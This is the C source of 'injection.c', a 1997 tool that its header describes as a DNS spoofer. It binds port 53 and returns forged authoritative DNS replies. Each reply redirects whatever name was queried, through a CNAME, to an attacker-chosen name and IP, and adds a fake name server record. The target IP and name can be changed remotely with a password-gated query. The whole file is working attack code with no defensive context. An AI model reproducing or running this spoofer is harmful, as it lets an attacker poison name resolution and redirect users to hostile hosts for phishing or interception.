

/*
   injection.c  DNS spoofer by savage@apostols.org      30/May/1997
   		based on jizz.c by teak@ib6ub9.com
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <strings.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <signal.h>

#define MAXBUFSIZE		64*1024
#define DEFAULT_TTL 60*5

#define DC_A            1
#define DC_NS           2
#define DC_CNAME        5
#define DC_SOA          6
#define DC_WKS          11
#define DC_PTR          12
#define DC_HINFO        13
#define DC_MINFO        14
#define DC_MX           15
#define DC_TXT          16

typedef struct
  {
    unsigned short id;

    unsigned char rd:1;		/* recursion desired */
    unsigned char tc:1;		/* truncated message */
    unsigned char aa:1;		/* authoritive answer */
    unsigned char opcode:4;	/* purpose of message */
    unsigned char qr:1;		/* response flag */

    unsigned char rcode:4;	/* response code */
    unsigned char unused:2;	/* unused bits */
    unsigned char pr:1;		/* primary server required (non standard) */
    unsigned char ra:1;		/* recursion available */

    unsigned short qdcount;
    unsigned short ancount;
    unsigned short nscount;
    unsigned short arcount;
  }
dnsheaderrec;

typedef struct
  {
    unsigned short labellen;
    char label[256];
    unsigned short type;
    unsigned short class;
    unsigned long ttl;
    unsigned short buflen;
    char buf[256];
  }
dnsrrrec;

typedef struct
  {
    dnsheaderrec h;

    dnsrrrec qd[20];
    dnsrrrec an[20];
    dnsrrrec ns[20];
    dnsrrrec ar[20];
  }
dnsrec;

char *dnssprintflabel (char *s, char *buf, char *p);
char *dnsaddlabel (char *p, char *label);
void dnstxt2rr (dnsrrrec * rr, char *b);
void dnsbuildpacket (dnsrec * dns, short qdcount, short ancount, short nscount, short arcount,...);
char *dnsaddbuf (char *p, void *buf, short len);
int dnsmakerawpacket (dnsrec * dns, char *buf);

unsigned long default_ttl;

unsigned long 
rev_long (l)
     unsigned long l;
{
  unsigned long i = 0;
  int n = sizeof (i);
  while (n--)
    {
      i = (i << 8) | (l & 255);
      l >>= 8;
    }
  return i;
}

char *
dnssprintflabel (char *s, char *buf, char *p)
{
  unsigned short i, len;
  char *b = NULL;

  len = (unsigned short) *(p++);
  while (len)
    {
      while (len >= 0xC0)
	{
	  if (!b)
	    b = p + 1;
	  p = buf + (ntohs (*((unsigned short *) (p - 1))) & ~0xC000);
	  len = (unsigned short) *(p++);
	}

      for (i = 0; i < len; i++)
	*(s++) = *(p++);

      *(s++) = '.';

      len = (unsigned short) *(p++);
    }

  *(s++) = 0;
  if (b)
    return (b);

  return (p);
}

char *
dnsaddlabel (char *p, char *label)
{
  char *p1;

  while ((*label) && (label))
    {
      if ((*label == '.') && (!*(label + 1)))
	break;

      p1 = strchr (label, '.');

      if (!p1)
	p1 = strchr (label, 0);

      *(p++) = p1 - label;
      memcpy (p, label, p1 - label);
      p += p1 - label;

      label = p1;
      if (*p1)
	label++;
    }
  *(p++) = 0;

  return (p);
}

void 
dnstxt2rr (dnsrrrec * rr, char *b)
{
  char *tok[20], *p;
  unsigned short numt = 0, i;
  static char *buf = NULL;

  if (!buf)
    {
      if ((buf = malloc (1024)) == NULL)
	{
	  perror ("malloc");
	  exit (-1);
	}
    }

  strcpy (buf, b);
  p = strtok (buf, " \t");
  do
    {
      tok[numt++] = p;
    }
  while (p = strtok (NULL, " \t"));

  p = dnsaddlabel (rr->label, tok[0]);
  rr->labellen = p - rr->label;

  i = 1;

  if (isdigit (*tok[i]))
    rr->ttl = htonl (atol (tok[i++]));
  else
    rr->ttl = htonl (default_ttl);

  if (strcmp (tok[i], "IN") == 0)
    i++;

  rr->class = htons (1);

  if (strcmp (tok[i], "A") == 0)
    {
      i++;
      rr->type = htons (DC_A);
      if (i < numt)
	{
	  inet_aton (tok[i], rr->buf);
	  rr->buflen = 4;
	}
      else
	rr->buflen = 0;
      return;
    }

  if (strcmp (tok[i], "CNAME") == 0)
    {
      i++;
      rr->type = htons (DC_CNAME);
      if (i < numt)
	{
	  p = dnsaddlabel (rr->buf, tok[i]);
	  rr->buflen = p - rr->buf;
	}
      else
	rr->buflen = 0;
      return;
    }

  if (strcmp (tok[i], "NS") == 0)
    {
      i++;
      rr->type = htons (DC_NS);
      if (i < numt)
	{
	  p = dnsaddlabel (rr->buf, tok[i]);
	  rr->buflen = p - rr->buf;
	}
      else
	rr->buflen = 0;
      return;
    }

  if (strcmp (tok[i], "PTR") == 0)
    {
      i++;
      rr->type = htons (DC_PTR);
      if (i < numt)
	{
	  p = dnsaddlabel (rr->buf, tok[i]);
	  rr->buflen = p - rr->buf;
	}
      else
	rr->buflen = 0;
      return;
    }

  if (strcmp (tok[i], "MX") == 0)
    {
      i++;
      rr->type = htons (DC_MX);
      if (i < numt)
	{
	  p = rr->buf;
	  *((unsigned short *) p) = htons (atoi (tok[i++]));
	  p += 2;
	  p = dnsaddlabel (p, tok[i]);
	  rr->buflen = p - rr->buf;
	}
      else
	rr->buflen = 0;
      return;
    }
}

void 
dnsbuildpacket (dnsrec * dns, short qdcount, short ancount, short nscount, short arcount,...)
{
  int i;
  va_list va;

  dns->h.qdcount = htons (qdcount);
  dns->h.ancount = htons (ancount);
  dns->h.nscount = htons (nscount);
  dns->h.arcount = htons (arcount);
  dns->h.rcode = 0;

  va_start (va, arcount);

  for (i = 0; i < qdcount; i++)
    dnstxt2rr (&dns->qd[i], va_arg (va, char *));

  for (i = 0; i < ancount; i++)
    dnstxt2rr (&dns->an[i], va_arg (va, char *));

  for (i = 0; i < nscount; i++)
    dnstxt2rr (&dns->ns[i], va_arg (va, char *));

  for (i = 0; i < arcount; i++)
    dnstxt2rr (&dns->ar[i], va_arg (va, char *));


  va_end (va);
}

char *
dnsaddbuf (char *p, void *buf, short len)
{
  memcpy (p, buf, len);
  return (p + len);
}

int 
dnsmakerawpacket (dnsrec * dns, char *buf)
{
  char *p;
  int i;
  unsigned short len;

  memcpy (buf, &dns->h, sizeof (dnsheaderrec));

  p = buf + sizeof (dnsheaderrec);

/********** Query ***********/
  for (i = 0; i < ntohs (dns->h.qdcount); i++)
    {
      p = dnsaddbuf (p, dns->qd[i].label, dns->qd[i].labellen);
      p = dnsaddbuf (p, &dns->qd[i].type, 2);
      p = dnsaddbuf (p, &dns->qd[i].class, 2);
    }

/********** Answer ***********/
  for (i = 0; i < ntohs (dns->h.ancount); i++)
    {
      p = dnsaddbuf (p, dns->an[i].label, dns->an[i].labellen);
      p = dnsaddbuf (p, &dns->an[i].type, 2);
      p = dnsaddbuf (p, &dns->an[i].class, 2);
      p = dnsaddbuf (p, &dns->an[i].ttl, 4);
      len = htons (dns->an[i].buflen);
      p = dnsaddbuf (p, &len, 2);
      p = dnsaddbuf (p, dns->an[i].buf, dns->an[i].buflen);
    }

/********** Nameservers ************/
  for (i = 0; i < ntohs (dns->h.nscount); i++)
    {
      p = dnsaddbuf (p, dns->ns[i].label, dns->ns[i].labellen);
      p = dnsaddbuf (p, &dns->ns[i].type, 2);
      p = dnsaddbuf (p, &dns->ns[i].class, 2);
      p = dnsaddbuf (p, &dns->ns[i].ttl, 4);
      len = htons (dns->ns[i].buflen);
      p = dnsaddbuf (p, &len, 2);
      p = dnsaddbuf (p, dns->ns[i].buf, dns->ns[i].buflen);
    }

/********** Additional ************/
  for (i = 0; i < ntohs (dns->h.arcount); i++)
    {
      p = dnsaddbuf (p, dns->ar[i].label, dns->ar[i].labellen);
      p = dnsaddbuf (p, &dns->ar[i].type, 2);
      p = dnsaddbuf (p, &dns->ar[i].class, 2);
      p = dnsaddbuf (p, &dns->ar[i].ttl, 4);
      len = htons (dns->ar[i].buflen);
      p = dnsaddbuf (p, &len, 2);
      p = dnsaddbuf (p, dns->ar[i].buf, dns->ar[i].buflen);
    }

  return (p - buf);
}

#define BFSIZE	1024

void 
main (int argc, char *argv[])
{
  int sock, fromlen, numread, len, query;
  struct sockaddr_in sa, from, to;
  struct in_addr rev;
  char *buf, *sendbuf;
  char *domainnamebuf;
  dnsheaderrec *dns;
  char *p;
  dnsrec dnsh;

  char *beginhost_QD, *beginhost_A, *beginhost_srch;
  char *fakenshost_A, *fakens_DOM;
  char *spoofedip_A, *spoofedip_PTR, *spoofedip_rev;
  char *pid_named;

  char FAKEIP[BFSIZE] = "194.179.44.64", FAKENAME[BFSIZE] = "The.Lammerz.Houze";
  char mybuff[BFSIZE], *bp = NULL;

  if (argc < 2)
    {
      printf ("usage: \n%s <password>\n");
      exit (-1);
    }

  if ((beginhost_QD = malloc (BFSIZE)) == NULL)
    {
      perror ("malloc");
      exit (-1);
    }

  if ((beginhost_A = malloc (BFSIZE)) == NULL)
    {
      perror ("malloc");
      exit (-1);
    }

  if ((beginhost_srch = malloc (BFSIZE)) == NULL)
    {
      perror ("malloc");
      exit (-1);
    }

  if ((fakenshost_A = malloc (BFSIZE)) == NULL)
    {
      perror ("malloc");
      exit (-1);
    }

  if ((fakens_DOM = malloc (BFSIZE)) == NULL)
    {
      perror ("malloc");
      exit (-1);
    }

  if ((spoofedip_A = malloc (BFSIZE)) == NULL)
    {
      perror ("malloc");
      exit (-1);
    }

  if ((spoofedip_PTR = malloc (BFSIZE)) == NULL)
    {
      perror ("malloc");
      exit (-1);
    }

  if ((spoofedip_rev = malloc (BFSIZE)) == NULL)
    {
      perror ("malloc");
      exit (-1);
    }

  if ((buf = malloc (MAXBUFSIZE)) == NULL)
    {
      perror ("malloc");
      exit (-1);
    }

  if ((sendbuf = malloc (MAXBUFSIZE)) == NULL)
    {
      perror ("malloc");
      exit (-1);
    }

  if ((domainnamebuf = malloc (MAXBUFSIZE)) == NULL)
    {
      perror ("malloc");
      exit (-1);
    }

  if ((sock = socket (AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
    {
      perror ("socket");
      exit (-1);
    }


  sa.sin_family = AF_INET;
/*  sa.sin_addr.s_addr = inet_addr(DEFAULTBINDHOST); */
  sa.sin_addr.s_addr = INADDR_ANY;
  sa.sin_port = htons (53);

  if (bind (sock, (struct sockaddr *) &sa, sizeof (sa)) < 0)
    {
      perror ("bind");
      exit (-1);
    }

  setvbuf (stdout, NULL, _IONBF, 0);

  while (1)
    {
      fromlen = sizeof (from);
      if ((numread = recvfrom (sock, buf, MAXBUFSIZE, 0, (struct sockaddr *) &from, &fromlen)) < 0)
	{
	  perror ("recvfrom");
	  continue;
	}

      /* Kludge to stop that damn router */
      if (from.sin_addr.s_addr == inet_addr ("194.179.44.2"))
	continue;

      dns = (dnsheaderrec *) buf;

      if (dns->qr)
	continue;

      p = dnssprintflabel (domainnamebuf, buf, &buf[sizeof (dnsheaderrec)]);
      query = ntohs (*(unsigned short *) p);

      strcpy (mybuff, domainnamebuf);
      bp = strtok (mybuff, "@");
      if (bp && *domainnamebuf == '@' && !strcmp (argv[1], bp))
	{
	  bp = strtok (NULL, "@");
	  if (bp)
	    strncpy (FAKEIP, bp, BFSIZE - 1);

	  bp = strtok (NULL, "@");
	  if (bp)
	    strncpy (FAKENAME, bp, BFSIZE - 1);

	  printf ("FakeIP: %s    FakeNAME: %s\n", FAKEIP, FAKENAME);
	}

      strcpy (beginhost_srch, ".");

      snprintf (fakenshost_A, BFSIZE - 1, "ns.%s IN A 6.6.6.6", FAKENAME);
      snprintf (fakens_DOM, BFSIZE - 1, "%s IN NS ns.%s", FAKENAME, FAKENAME);

      snprintf (spoofedip_A, BFSIZE - 1, "%s IN A %s", FAKENAME, FAKEIP);

      rev.s_addr = rev_long (inet_addr (FAKEIP));
      snprintf (spoofedip_PTR, BFSIZE - 1, "%s.IN-ADDR.ARPA IN PTR %s", (char *) inet_ntoa (rev.s_addr), FAKENAME);
      default_ttl = DEFAULT_TTL;

      printf ("from %s : %d : '%s' (%d)\n", inet_ntoa (from.sin_addr), ntohs (from.sin_port), domainnamebuf, query);

      snprintf (beginhost_QD, BFSIZE - 1, "%s IN", domainnamebuf);
      snprintf (beginhost_A, BFSIZE - 1, "%s 1 IN CNAME %s", domainnamebuf, FAKENAME);

      dnsbuildpacket (&dnsh, 1, 4, 1, 0,
		      beginhost_QD,
		      beginhost_A,
		      spoofedip_A,
		      spoofedip_PTR,
		      fakenshost_A,
		      fakens_DOM);

      dnsh.qd[0].type = htons (query);

      dnsh.h.id = ((dnsheaderrec *) buf)->id;
      dnsh.h.qr = 1;
      dnsh.h.aa = 1;

      len = dnsmakerawpacket (&dnsh, sendbuf);

      to.sin_family = AF_INET;
      to.sin_addr.s_addr = from.sin_addr.s_addr;
      to.sin_port = from.sin_port;

      if (sendto (sock, sendbuf, len, 0, (struct sockaddr *) &to, sizeof (to)) < 0)
	{
	  perror ("sendto");
	  continue;
	}
    }
}
